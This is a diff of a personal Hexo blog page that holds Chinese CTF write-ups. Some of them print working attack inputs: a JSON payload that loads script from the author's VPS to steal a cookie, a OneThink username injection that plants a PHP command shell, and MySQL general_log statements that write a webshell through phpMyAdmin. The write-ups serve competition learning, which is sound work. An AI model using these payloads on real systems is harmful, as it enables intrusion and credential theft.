-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/08/31/rwctf/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="bak6ry">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="bak6ry">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/08/31/rwctf/" itemprop="url">rwctf和南电新生平台一题</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-31T15:24:00+08:00">
-                2018-08-31
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/比赛/" itemprop="url" rel="index">
-                    <span itemprop="name">比赛</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>#rwctf</p>
-<p>##签到题</p>
-<p>想了好久，结果发现只要尝试对这个网站进行常规的攻击，就会给flag，这个比赛果然果然比较接近实战</p>
-<p>##dot free<br>先测试了一下那个输入框里输入的地址会不会访问，发现不会，但是输入不同的值后端传回不同的内容，测试了一下感觉是个正则，因为正则用的比较多，我就想如果给正则传一个意外的值正则有可能会报错看看它后端到底是怎么写的,fuzz测试后发现post url=1会报错，报错页面中存在正则</p>
-<pre><code>e.data.iframe.value.indexOf(&apos;.&apos;) == -1
-e.data.iframe.value.indexOf(&quot;//&quot;) == -1
-e.data.iframe.value.indexOf(&quot;。&quot;) == -1
-typeof(e.data.iframe != &apos;object&apos;)
-</code></pre><p>ip中不能有. 和//于是十进制构造ip绕过，/\绕过\</p>
-<p>然后是JSON.parse说明要传入一个json_encode<br>于是构造Payload<br><code>http://13.57.104.34/?{&quot;iframe&quot;:{&quot;value&quot;:&quot;\\\\vps的ip:4444&quot;}}</code><br>调用vps的js获取cookie,在vps的xss平台中拿到flag。</p>
-<p>##西电新出的一道代码审计题，没有wp，感觉题还不错，就写一下</p>
-<p><a href="http://13.57.246.101/moe/index.php" target="_blank" rel="noopener">http://13.57.246.101/moe/index.php</a></p>
-<p>第一步正则很好绕，第二部json_decode做了我两个多小时，结果最后总算弄出来了，最后发现这个题的关键是要猜secret的数据是如何构造的，感觉还不错，分享一下，猜测可能是数字和字母的组合，类似6asdwe这种形式，6asdwe==6E0，如果然后全是数字的话类似1.56161这种形式，也用1E0这种方式去绕，如果它全是字母就要这么绕，awsdad==6E-99999999,所以就这样猜测它secret是怎么组合的，利用==号弱类型，比较的时候的类型转换，6e0是6，6a和数字==比较时会只看第一个数字，后面的字母会被抹去，然后6就和6相等了，6e-999999那个是利用超过最大精度处理时会舍去，像0.000000000001就等于0了，0和字母==比较，字母会转换为0,然后就相等了</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/23/巅峰极客/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="bak6ry">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="bak6ry">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/07/23/巅峰极客/" itemprop="url">巅峰极客2018第一场部分wp</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-23T10:49:00+08:00">
-                2018-07-23
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/比赛/" itemprop="url" rel="index">
-                    <span itemprop="name">比赛</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>#web：</p>
-<p>拿到题目先百度一下，于是找到onethink的一个漏洞。</p>
-<p>WooYun-2016-185742</p>
-<p>就是注册个账号为：</p>
-<p>%250a%24a%3d%24_GET%5ba%5d%3b%2f%2f%250aecho+%60%24a%60%3b%2f%2f</p>
-<p>就可以getshell， 但因为账号长度有限制。所以分别两个来注册</p>
-<p> 账号一的用户名：%0a$a=$_GET[a];//</p>
-<p> 账号二的用户名：%0aecho <code>$a</code>;//</p>
-<p> 注意要用burp来改包，不然会失败。之后依次登入，也要用burp来改包登入。在那之后然后访问生成的缓存文件</p>
-<p>本题的关键是通过源码<a href="http://www.zip泄露在本地浮现的时候找到生成的缓存文件名" target="_blank" rel="noopener">www.zip泄露在本地浮现的时候找到生成的缓存文件名</a></p>
-<p>例如 /Runtime/Temp/onethink_2bb202459c30a1628513f40ab22fa01a.php</p>
-<p>find / -name flag*<br>查找下flag位置 cat就行了</p>
-<p>/Runtime/Temp/onethink_2bb202459c30a1628513f40ab22fa01a.php?a=cat  /temp/flag</p>
-<p>#杂项</p>
-<p>lsb隐写，三个通道分离出来，Ook，brainfcuk解密就行了</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/23/sctf2018/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="bak6ry">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="bak6ry">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/07/23/sctf2018/" itemprop="url">sctf2018部分wp</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-23T09:49:00+08:00">
-                2018-07-23
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/比赛/" itemprop="url" rel="index">
-                    <span itemprop="name">比赛</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>神奇的Modbus<br>发现是pcapng后缀的，用wireshark打开，过滤modbus，追钟tcp流得到flag.<br>推荐去学下wireshark数据包分析，教程太多了适合自己的才是最好的，我就不分享链接了。</p>
-<p>神秘的交易<br> <img src="/ctf/1.png" alt=""><br><img src="/ctf/2.png" alt=""></p>
-<p>学习链接：<a href="https://bbs.pediy.com/thread-151259.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-151259.htm</a></p>
-<p>因为题目告知是一张4442的接触式卡，所以对应发送的命令格式为 一个字节指令类型 一个字节地址 一个字节数据</p>
-<p> <img src="/ctf/3.png" alt=""><br>物体会依次发送该数据包到卡片，其中s1 s2 s3拼在一起就是那三个字节的口令了！</p>
-<ol>
-<li><p>.找数据s1 <img src="/ctf/4.png" alt="">在中间标线处找到0x33<br>的二进制：11001100（注意数完一个字节）</p>
-<p><img src="/ctf/5.png" alt=""></p>
-</li>
-</ol>
-<p><img src="/ctf/6.png" alt=""></p>
-<p>(数完八个)</p>
-<ol start="2">
-<li>找<img src="/ctf/7.png" alt=""> 中的0x01依次向右数的第二个字节为0x01的二进制(每个字节是八位，所有数八个)接下来的一个字节就是s1了，注意！！！！数据从低位到高位的顺序发送，所以读完8个过后要倒一下，</li>
-<li>二进制转16进制（题目要求的）</li>
-<li>同理可以找到s2和s3. s1,s2,s3拼接起来为加密密钥。</li>
-</ol>
-<p>肥宅快乐题<br>我很喜欢这个题，拿道题的第一反应就是玩，真的是肥宅快乐题。我很快乐，但我不胖。拿到题看到Flash游戏，通关后，注意与NPC的对话哦;)我是真想去通关，正好做题做的好累，但是发现通关一个游戏更累就放弃了，或许这就是我做这个题的动力吧。于是想到下载个flash的反编译软件：<img src="/ctf/8.png" alt=""> 然后打开文件 <img src="/ctf/9.png" alt="">，游戏里所有对话一定写在这某个地方，发现动作里有源代码，搜索游戏中开场的对话，发现每句前面有t0,t1,t2来标识。马上想到可以通过搜索t0找到所有段对话的开始，然后，去最后的几个的t0那里应该就是游戏结束的地方了，果不其然，<br><img src="/ctf/10.png" alt=""><br>：找到了flag，base64解密后获得。这里说个ctf心得吧，我这个题本来可以前三个做出来的，结果上了个厕所，在厕所里玩了会手机，就变成第8个了，所以，做题要专注。。。。。。</p>
-<p>侧信道初探<br>学习链接：<a href="https://g2ex.github.io/2016/05/31/Power-Analysis-Attacks-on-Smart-Card/" target="_blank" rel="noopener">https://g2ex.github.io/2016/05/31/Power-Analysis-Attacks-on-Smart-Card/</a></p>
-<p>简单的能量分析攻击（SPA）真的很简单，<br><img src="/ctf/11.png" alt=""><br> 密钥位为 0 时运算的功耗和密钥位为 1 时运算的功耗存在差异，通过这样的差异分析出密钥位的值，按照一定规律组合得到完整的密钥<br><img src="/ctf/12.png" alt=""><br>以 为分界线分，可以分成10份，然后按照波长也就是宽度。宽的能量消耗大也就对应1，窄的对应0，最后数出来是得flag，之前一直弄不对，最后发现SCTF大写就对了，真的是这里卡太久了，签到题上面都是小写，哎经验不足，丢失大量时间，以后吸取教训。<br>easiest web - phpmyadmin<br>学习链接： <a href="http://www.kernelpicnic.net/2016/03/06/BKPCTF-Suffolk-Downs-Bug-Bounty-Write-Up.html" target="_blank" rel="noopener">http://www.kernelpicnic.net/2016/03/06/BKPCTF-Suffolk-Downs-Bug-Bounty-Write-Up.html</a></p>
-<p>Web服务器现在关了，进不去了，所以就没法附图了，不好意思，不过学习链接的题和这个很像，wp也很详细。推荐去看一波。<br>root/root 弱口令进phpmyAdmin<br>收集下信息，翻看下数据库表，没啥发现<br>尝试写shell，随便猜个路径 /var/www/html<br>失败，提示开启了安全模式<br>尝试利用mysql日志文件写shell<br>show variables like “%general_log”;– 查看变量，发现general_log_file值为c:\phpStudy\mysql\xxx<br>看到phpstudy，猜测网站根目录为phpstudy/www目录</p>
-<p>set global general_log=”ON”;– 开启mysql日志<br>set global general_log_file=”c:/phpstudy/www/shell.php”;– 设置日志保存路径<br>select “&lt;?php @$_GET<a href="$_POST[&#39;c&#39;]">‘f’</a>;?&gt;”;– 写shell<br>菜刀连接，flag在c盘下</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-  </section>
-
-  
-
-
-          </div>
-          
-
-
-          
-
-        </div>
-        
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
-    </div>
-  </div>
-
-  <aside id="sidebar" class="sidebar">
-    
-    <div class="sidebar-inner">
-
-      
-
-      
-
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
-        <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-            
-              <p class="site-author-name" itemprop="name">bak6ry</p>
-              <p class="site-description motion-element" itemprop="description"></p>
-          </div>
-
-          <nav class="site-state motion-element">
-
-            
-              <div class="site-state-item site-state-posts">
-              
-                <a href="/archives/">
-              
-                  <span class="site-state-item-count">5</span>
-                  <span class="site-state-item-name">日志</span>
-                </a>
-              </div>
-            
-
-            
-              
-              
-              <div class="site-state-item site-state-categories">
-                <a href="/categories/index.html">
-                  <span class="site-state-item-count">1</span>
-                  <span class="site-state-item-name">分类</span>
-                </a>
-              </div>
-            
-
-            
-
-          </nav>
-
-          
-
-          
-
-          
-          
-
-          
-          
-
-          
-
-        </div>
-      </section>
-
-      
-
-      
-
-    </div>
-  </aside>
-
-
-        
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
-  <span class="with-love">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">bak6ry</span>
-
-  
-</div>
-
-<!--
-<div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
-
-
-
-  <span class="post-meta-divider">|</span>
-
-
-
-  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
-
-
--->
-
-        
-
-
-
-
-
-
-
-        
-      </div>
-    </footer>
-
-    
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
-        
-      </div>
-    
-
-    
-
-  </div>
-
-  
-
-<script type="text/javascript">
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
   }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main index-page">
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2018/09/01/lampiao/" >
+            
+                <span>vulnhub|渗透测试lampiao</span>
+        </a>
+        <div class="abstract-content">
+            该文已先在先知社区发表：原文地址：https://xz.aliyun.com/t/2552
+#vulnhub|渗透测试lampiao
+##题记
+最近在打靶机，发现了一个挺有意思的靶机，这里想跟大家分享一下.
+##环境准备vulnhub最近出的一台靶机
+靶机Lampiao.zip (Size: 669 MB)
+Download: https://mega.nz/#!aG4AAaDB!CBLRRYQsAhTOyPJqyjC0Blr-weMH9QMdYbPfMj0LGeM
+Download (Mirror): https://download.vulnhub.com/lampiao/Lampi...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/09/01</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2018/08/31/ctf入门总结/" >
+            
+                <span>ctf入门总结</span>
+        </a>
+        <div class="abstract-content">
+            下面中实验室指的是网络安全实验室
+题目全部来自bugku，南邮和网络安全实验室，题较基础，实验吧要复杂些，
+文中所有知识点内容并不全，要学习原理及深入得自己去找资源学习，自学与搜集信息的能力是必不可少的
+入门推荐书籍(必看):《白帽子讲web安全 》《代码审计:企业级web代码安全架构》
+什么是CTF？CTF（Capture The Flag）中文一般译作夺旗赛，在网络安全领域中指的是网络安全技术人员之间进行技术竞技的一种比赛形式CTF比赛通常包含的题目类型包括MISC、PPC、CRYPTO、PWN、REVERSE、WEB、STEGA
+1.养成看源代码的习惯(简单)flag在源代码中()...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/08/31</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2018/08/31/rwctf/" >
+            
+                <span>rwctf和南电新生平台一题</span>
+        </a>
+        <div class="abstract-content">
+            #rwctf
+##签到题
+想了好久，结果发现只要尝试对这个网站进行常规的攻击，就会给flag，这个比赛果然果然比较接近实战
+##dot free先测试了一下那个输入框里输入的地址会不会访问，发现不会，但是输入不同的值后端传回不同的内容，测试了一下感觉是个正则，因为正则用的比较多，我就想如果给正则传一个意外的值正则有可能会报错看看它后端到底是怎么写的,fuzz测试后发现post url=1会报错，报错页面中存在正则
+e.data.iframe.value.indexOf(&apos;.&apos;) == -1
+e.data.iframe.value.indexOf(&quot;//&qu...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/08/31</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2018/07/23/巅峰极客/" >
+            
+                <span>巅峰极客2018第一场部分wp</span>
+        </a>
+        <div class="abstract-content">
+            #web：
+拿到题目先百度一下，于是找到onethink的一个漏洞。
+WooYun-2016-185742
+就是注册个账号为：
+%250a%24a%3d%24_GET%5ba%5d%3b%2f%2f%250aecho+%60%24a%60%3b%2f%2f
+就可以getshell， 但因为账号长度有限制。所以分别两个来注册
+ 账号一的用户名：%0a$a=$_GET[a];//
+ 账号二的用户名：%0aecho $a;//
+ 注意要用burp来改包，不然会失败。之后依次登入，也要用burp来改包登入。在那之后然后访问生成的缓存文件
+本题的关键是通过源码www.zip泄露在本地浮现的时候找到...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/07/23</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2018/07/23/sctf2018/" >
+            
+                <span>sctf2018部分wp</span>
+        </a>
+        <div class="abstract-content">
+            神奇的Modbus发现是pcapng后缀的，用wireshark打开，过滤modbus，追钟tcp流得到flag.推荐去学下wireshark数据包分析，教程太多了适合自己的才是最好的，我就不分享链接了。
+神秘的交易 
+学习链接：https://bbs.pediy.com/thread-151259.htm
+因为题目告知是一张4442的接触式卡，所以对应发送的命令格式为 一个字节指令类型 一个字节地址 一个字节数据
+ 物体会依次发送该数据包到卡片，其中s1 s2 s3拼在一起就是那三个字节的口令了！
+
+.找数据s1 在中间标线处找到0x33的二进制：11001100（注意数完一个字节）
+...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/07/23</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    <!-- paginator  -->
+    
+</main>
+            <!-- profile -->
+            
+            <div class="profile">
+    <img class="profile-avatar" alt="avatar" src= /avatar/Misaka.jpg >
+    <div class="profile-name">bak6ry</div>
+    
+    <div class="profile-signature">
+        witness me
+    </div>
+    
+    
+    <div class="profile-social">
+        
+    
+        
+            
+                <a href="mailto:1183621141@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/bak6ry" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title=wechat>
+                  
+                  <img class="profile-qr" src="/assets/example_qr.png" />
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="/bak6ry" class="iconfont-archer twitter" target="_blank" title=twitter></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    
+        <div class="friends">
+            <div>FRIENDS</div>
+            
+                
+                    <span>
+                        <a href= //hu3sky.ooo/ target="_black">Hu3sky</a>
+                    </span>
+                
+            
+                
+                    <span>
+                        <a href= //hpdoger.me/ target="_black">hpdoger</a>
+                    </span>
+                
+            
+                
+            
+        </div>
+    
+    
+        <div class="about-me">
+            <a href = "/about" >ABOUT ME</a>
+        </div>
+    
+</div>
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:1183621141@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/bak6ry" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title=wechat>
+                  
+                  <img class="profile-qr" src="/assets/example_qr.png" />
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="/bak6ry" class="iconfont-archer twitter" target="_blank" title=twitter></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 5
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/01</span><a class="archive-post-title" href= "/2018/09/01/lampiao/" >vulnhub|渗透测试lampiao</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/31</span><a class="archive-post-title" href= "/2018/08/31/rwctf/" >rwctf和南电新生平台一题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/31</span><a class="archive-post-title" href= "/2018/08/31/ctf入门总结/" >ctf入门总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/23</span><a class="archive-post-title" href= "/2018/07/23/巅峰极客/" >巅峰极客2018第一场部分wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/23</span><a class="archive-post-title" href= "/2018/07/23/sctf2018/" >sctf2018部分wp</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="比赛"><span class="iconfont-archer">&#xe60a;</span>比赛</span>
+    
+        <span class="sidebar-category-name" data-categories="靶机"><span class="iconfont-archer">&#xe60a;</span>靶机</span>
+    
+    </div>
